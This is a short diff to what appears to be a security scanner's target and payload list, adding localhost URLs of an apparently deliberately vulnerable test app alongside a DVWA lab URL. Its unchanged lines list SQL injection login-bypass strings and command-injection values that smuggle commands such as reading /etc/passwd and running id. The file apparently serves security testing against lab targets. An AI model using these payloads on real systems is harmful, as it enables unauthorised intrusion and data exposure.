@@ -15,6 +15,21 @@ http://forum.wampserver.com/read.php?2,13744
 
 https://dvwa.exp-9.com/login.php
 
+# HTML with vulnerable inline JS
+http://localhost:8088/
+
+# Vulnerable external JS
+http://localhost:8088/static/app.js
+
+# Exposes API keys/secrets (JSON)
+http://localhost:8088/api/keys
+
+# Echoes username/password query params
+http://localhost:8088/api/login
+
+# Hints to hidden paths
+http://localhost:8088/robots.txt
+
 admin' --
 admin' #
 admin'/*
@@ -31,3 +46,5 @@ a|/usr/bin/id
 %0Acat%20/etc/passwd
 %0A/usr/bin/id
 %0Aid
+
+
